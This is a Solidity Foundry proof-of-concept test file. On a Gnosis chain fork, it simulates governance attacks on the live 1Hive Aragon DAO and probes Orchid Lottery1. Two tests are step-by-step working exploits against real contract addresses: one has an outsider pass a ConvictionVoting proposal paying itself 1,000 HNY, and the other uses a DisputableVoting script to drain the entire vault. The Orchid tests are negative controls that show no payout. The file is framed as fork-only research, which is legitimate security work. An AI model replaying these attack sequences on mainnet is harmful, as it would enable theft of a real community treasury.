// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console} from "forge-std/Test.sol";

/* =====================================================================================
   gnosis-residual — Tier-3 fork PoC (READ-ONLY research; fork-only; no mainnet txs)
   Target 1: 1Hive Aragon DAO (Gnosis) — unprivileged governance capture of the vault
   Target 2: Orchid Lottery1 (Gnosis) — outsider claim path (negative control)
   Fork: Gnosis chain id 100, pinned block 48,767,754.
   ===================================================================================== */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IStaking {
    function stake(uint256 _amount, bytes calldata _data) external;
    function allowManager(address _lockManager, uint256 _allowance, bytes calldata _data) external;
    function lockedBalanceOf(address _user) external view returns (uint256);
}

interface IAgreement {
    function sign(uint256 _settingId) external;
    function getCurrentSettingId() external view returns (uint256);
}

interface ICV {
    function addProposal(string calldata _title, bytes calldata _link, uint256 _requestedAmount, bool _stable, address _beneficiary) external;
    function stakeToProposal(uint256 _proposalId, uint256 _amount) external;
    function executeProposal(uint256 _proposalId) external;
    function proposalCounter() external view returns (uint256);
    function calculateThreshold(uint256 _requestedAmount) external view returns (uint256);
    function getProposal(uint256 _proposalId) external view returns (uint256, bool, address, uint256, uint256, uint64, uint256, uint8, address, uint256);
}

interface IDV {
    function newVote(bytes calldata _executionScript, bytes calldata _context) external returns (uint256);
    function vote(uint256 _voteId, bool _supports) external;
    function executeVote(uint256 _voteId, bytes calldata _executionScript) external;
    function canExecute(uint256 _voteId) external view returns (bool);
}

interface IOrchid {
    struct Ticket {
        bytes32 data;
        bytes32 reveal;
        uint256 packed0;
        uint256 packed1;
        bytes32 r;
        bytes32 s;
    }
    function claim(address token, address recipient, Ticket[] calldata tickets, bytes32[] calldata refunds) external;
    function edit(address signer, int256 adjust, int256 warn, uint256 retrieve) external payable;
    function read(address token, address funder, address signer) external view returns (uint256, uint256);
}

contract GnosisResidual is Test {
    // ---- 1Hive Aragon DAO (Gnosis) ----
    address constant HNY = 0x71850b7E9Ee3f13Ab46d67167341E4bDc905Eef9;
    address constant VAULT = 0x4ba7362F9189572CbB1216819a45aba0d0B2D1CB; // Agent, holds 21,398.66 HNY
    address constant CV = 0x0B21081C6F8b1990f53FC76279Cc41ba22D7AFE2; // ConvictionVoting (holds Agent TRANSFER_ROLE)
    address constant DV = 0xfBd0B2726070a9D6AfF6D7216c9E9340Eae68b2a; // DisputableVoting (holds Agent EXECUTE_ROLE)
    address constant AG = 0x59A15718992A42082aB2306bc6Cbd662958a178c; // Agreement
    address constant STAKING = 0x0E25B918C9Fb2fEA5d42011d1F4B9f8c61B453e7; // HNY staking pool

    // ---- Orchid Lottery1 (Gnosis) ----
    address constant ORCHID = 0x6dB8381b2B41b74E17F5D4eB82E8d5b04ddA0a82;
    // real (funder, signer) pair with escrow: 50 xDAI escrow, created block 20,579,283
    address constant ORCHID_FUNDER = 0x8DF9Bd5b38765D32DAD71eD581d17c88D9198662;
    address constant ORCHID_SIGNER = 0xCF3ce759bDA0f84Dcb7C1db14f346B5cB1FA7087;

    uint256 constant FORK_BLOCK = 48_767_754;

    function setUp() public {
        // GNOSIS_RPC_URL may be present-but-empty in CI; fall back to a public endpoint.
        string memory rpc = vm.envOr("GNOSIS_RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = "https://rpc.gnosischain.com";
        vm.createSelectFork(rpc, FORK_BLOCK);
    }

    /// Simulate market acquisition of HNY at the fork block (MiniMeToken checkpoint write;
    /// forge `deal` cannot write MiniMe checkpoint storage). The buy leg itself is modelled
    /// off-chain (DEX round trip) — see README/analysis.
    function _simulateHnyAcquisition(address to, uint256 amount) internal {
        bytes32 lenSlot = keccak256(abi.encode(to, uint256(8))); // balances mapping is slot 8
        vm.store(HNY, lenSlot, bytes32(uint256(1)));
        bytes32 elemSlot = keccak256(abi.encode(lenSlot));
        vm.store(HNY, elemSlot, bytes32((amount << 128) | uint256(block.number)));
    }

    /* ---------------------------------------------------------------------------
       TEST 1 — ConvictionVoting path: fresh unprivileged address creates a proposal
       paying itself 1,000 HNY from the DAO vault and executes it after conviction.
       ACL gates (live, block 48,767,754): ANY holds CV.CREATE_PROPOSALS_ROLE;
       CV holds VAULT.TRANSFER_ROLE; executeProposal is permissionless.
       --------------------------------------------------------------------------- */
    function test_cv_outsider_extraction() public {
        address attacker = makeAddr("attacker");
        _simulateHnyAcquisition(attacker, 1_100e18);
        assertEq(IERC20(HNY).balanceOf(attacker), 1_100e18, "acquisition simulated");

        uint256 vaultBefore = IERC20(HNY).balanceOf(VAULT);
        console.log("vault HNY before:", vaultBefore / 1e18);

        vm.startPrank(attacker);
        // 1. sign the Agreement (permissionless; anyone may sign)
        IAgreement(AG).sign(IAgreement(AG).getCurrentSettingId());
        // 2. stake 20 HNY into the HNY staking pool + allow the Agreement to lock the
        //    action collateral (6.061864241695410850 HNY, live requirement id 3)
        IERC20(HNY).approve(STAKING, 20e18);
        IStaking(STAKING).stake(20e18, "");
        IStaking(STAKING).allowManager(AG, 20e18, "");
        // 3. create a proposal that pays the attacker 1,000 HNY from the vault
        uint256 pid = ICV(CV).proposalCounter();
        ICV(CV).addProposal("zombie-hunt II poc", "", 1_000e18, false, attacker);
        // 4. stake on own proposal (tokens never leave the wallet - only a balance check)
        ICV(CV).stakeToProposal(pid, 1_000e18);
        vm.stopPrank();

        (, , , uint256 staked, , , , , , uint256 threshold) = ICV(CV).getProposal(pid);
        console.log("proposal", pid, "staked HNY:", staked / 1e18);
        console.log("threshold (conviction units):", threshold);
        console.log("calculateThreshold(1000e18):", ICV(CV).calculateThreshold(1_000e18));
        assertGt(threshold, 0, "threshold live");

        // NEGATIVE CONTROL: cannot execute before conviction matures
        vm.expectRevert(bytes("CV_INSUFFICIENT_CONVICION"));
        ICV(CV).executeProposal(pid);

        // 5. wait for conviction (block-based). 1,000 HNY needs ~51.2k blocks; roll 80k.
        vm.roll(block.number + 80_000);

        // 6. executeProposal is permissionless - a bystander executes it
        address bystander = makeAddr("bystander");
        vm.prank(bystander);
        ICV(CV).executeProposal(pid);

        uint256 vaultAfter = IERC20(HNY).balanceOf(VAULT);
        console.log("vault HNY after:", vaultAfter / 1e18);
        assertEq(vaultBefore - vaultAfter, 1_000e18, "vault paid 1,000 HNY to attacker");
        assertEq(IERC20(HNY).balanceOf(attacker), 1_100e18 - 20e18 + 1_000e18, "attacker net +1,000 HNY (stake still theirs)");
    }

    /* ---------------------------------------------------------------------------
       TEST 2 — DisputableVoting path: fresh unprivileged address with 7,600 HNY
       (held across one snapshot block) creates a vote whose EVM script drains the
       ENTIRE vault to itself. ANY holds DV.CREATE_VOTES_ROLE; DV holds
       VAULT.EXECUTE_ROLE; executeVote is permissionless after voteTime + delay.
       --------------------------------------------------------------------------- */
    function test_dv_full_vault_drain() public {
        address attacker = makeAddr("attacker2");
        _simulateHnyAcquisition(attacker, 7_600e18);
        // roll one block so the vote snapshot (block N-1) sees the balance
        vm.roll(block.number + 1);

        uint256 vaultBefore = IERC20(HNY).balanceOf(VAULT);
        console.log("vault HNY before:", vaultBefore / 1e18);

        // EVM calls script (spec id 1): Agent.execute(HNY, 0, HNY.transfer(attacker, vaultBefore))
        bytes memory inner = abi.encodeWithSignature("transfer(address,uint256)", attacker, vaultBefore);
        bytes memory agentCall = abi.encodeWithSignature("execute(address,uint256,bytes)", HNY, uint256(0), inner);
        bytes memory script = abi.encodePacked(bytes4(0x00000001), VAULT, uint32(agentCall.length), agentCall);

        vm.startPrank(attacker);
        IAgreement(AG).sign(IAgreement(AG).getCurrentSettingId());
        IERC20(HNY).approve(STAKING, 20e18);
        IStaking(STAKING).stake(20e18, "");
        IStaking(STAKING).allowManager(AG, 20e18, "");
        uint256 vid = IDV(DV).newVote(script, "");
        IDV(DV).vote(vid, true);
        vm.stopPrank();
        console.log("vote id:", vid);

        // NEGATIVE CONTROL: cannot execute while the vote is open
        vm.expectRevert();
        IDV(DV).executeVote(vid, script);

        // voteTime 5d + executionDelay 1d (+ quiet-ending margin)
        vm.warp(block.timestamp + 8 days);
        vm.roll(block.number + 8 days / 5); // Gnosis ~5s blocks

        assertTrue(IDV(DV).canExecute(vid), "vote passed and executable");
        address bystander = makeAddr("bystander2");
        vm.prank(bystander);
        IDV(DV).executeVote(vid, script);

        uint256 vaultAfter = IERC20(HNY).balanceOf(VAULT);
        console.log("vault HNY after:", vaultAfter / 1e18);
        assertEq(vaultAfter, 0, "entire vault drained");
        assertEq(IERC20(HNY).balanceOf(attacker), 7_600e18 - 20e18 + vaultBefore, "attacker received whole vault");
    }

    /* ---------------------------------------------------------------------------
       TEST 3 — Orchid Lottery1: a forged ticket for a REAL funded account
       (funder 0x8df9bd..., signer 0xcf3ce7..., 50 xDAI escrow) cannot extract
       anything: ecrecover returns address(0) and no (token=0, funder, signer=0)
       account exists (verified: 0 of 30,407 Create events have signer==0).
       --------------------------------------------------------------------------- */
    function test_orchid_forged_ticket_no_payout() public {
        uint256 potBefore = ORCHID.balance;
        assertGt(potBefore, 99_000e18, "pot live");

        (uint256 packedBefore, ) = IOrchid(ORCHID).read(address(0), ORCHID_FUNDER, ORCHID_SIGNER);
        assertEq(packedBefore >> 128, 50e18, "target account has 50 xDAI escrow");

        IOrchid.Ticket[] memory tickets = new IOrchid.Ticket[](1);
        tickets[0] = _forgeTicket(ORCHID_FUNDER, 50e18);
        bytes32[] memory refunds = new bytes32[](0);

        address attacker = makeAddr("orchidAttacker");
        vm.prank(attacker);
        IOrchid(ORCHID).claim(address(0), attacker, tickets, refunds);

        assertEq(ORCHID.balance, potBefore, "pot unchanged (forged signature rejected)");
        assertEq(attacker.balance, 0, "attacker got nothing");
        (uint256 packedAfter, ) = IOrchid(ORCHID).read(address(0), ORCHID_FUNDER, ORCHID_SIGNER);
        assertEq(packedAfter, packedBefore, "victim escrow untouched");
    }

    /* ---------------------------------------------------------------------------
       TEST 4 — Orchid: attacker self-signs a VALID ticket naming the victim funder.
       ecrecover returns the attacker, but no (token=0, funder, attacker) account has
       escrow -> zero payout. A valid signature only spends the signer's OWN escrow.
       --------------------------------------------------------------------------- */
    function test_orchid_selfsigned_ticket_no_payout() public {
        uint256 potBefore = ORCHID.balance;
        uint256 pk = 0xA11CE;
        address attacker = vm.addr(pk);

        IOrchid.Ticket memory t = _forgeTicket(ORCHID_FUNDER, 50e18);
        // make the signature valid for the attacker key
        bytes32 digest = keccak256(
            abi.encodePacked(
                bytes1(0x19), bytes1(0x00), ORCHID, bytes32(block.chainid), address(0),
                attacker, keccak256(abi.encodePacked(t.reveal)), t.packed0, t.packed1 >> 1, t.data
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        t.packed1 = (t.packed1 & ~uint256(1)) | uint256(v - 27);
        t.r = r;
        t.s = s;

        IOrchid.Ticket[] memory tickets = new IOrchid.Ticket[](1);
        tickets[0] = t;
        bytes32[] memory refunds = new bytes32[](0);

        vm.prank(attacker);
        IOrchid(ORCHID).claim(address(0), attacker, tickets, refunds);

        assertEq(ORCHID.balance, potBefore, "pot unchanged (self-signed ticket spends nothing)");
        assertEq(attacker.balance, 0, "attacker got nothing");
    }

    /* ---------------------------------------------------------------------------
       TEST 5 — Orchid H-O control: a funder can self-withdraw its own escrow
       (deposit 1 xDAI, withdraw 1 xDAI). Funds are holder-recoverable, not stuck.
       --------------------------------------------------------------------------- */
    function test_orchid_funder_self_withdraw() public {
        address funder = makeAddr("orchidFunder");
        address signer = makeAddr("orchidSigner");
        vm.deal(funder, 5 ether);

        vm.prank(funder);
        IOrchid(ORCHID).edit{value: 1 ether}(signer, int256(0), int256(0), uint256(0));
        (uint256 amt, ) = IOrchid(ORCHID).read(address(0), funder, signer);
        assertEq(amt, 1 ether, "deposit recorded");

        vm.prank(funder);
        IOrchid(ORCHID).edit{value: 0}(signer, int256(0), int256(0), uint256(1 ether));
        assertEq(funder.balance, 5 ether, "funder withdrew its own funds");
    }

    /// Build a forged ticket with valid expiry + PoW grind, invalid ECDSA (r=3,s=4).
    function _forgeTicket(address funder, uint256 amount) internal view returns (IOrchid.Ticket memory t) {
        uint256 issued = block.timestamp;
        uint256 nonce = 1;
        t.packed0 = (issued << 192) | (nonce << 128) | amount;
        // bits 161..224 = max uint64 -> PoW check always passes (grindable by design)
        t.packed1 = (uint256(1_000_000) << 225) | (uint256(type(uint64).max) << 161) | (uint256(uint160(funder)) << 1);
        t.data = bytes32(0);
        t.reveal = bytes32(uint256(2));
        t.r = bytes32(uint256(3));
        t.s = bytes32(uint256(4));
    }
}
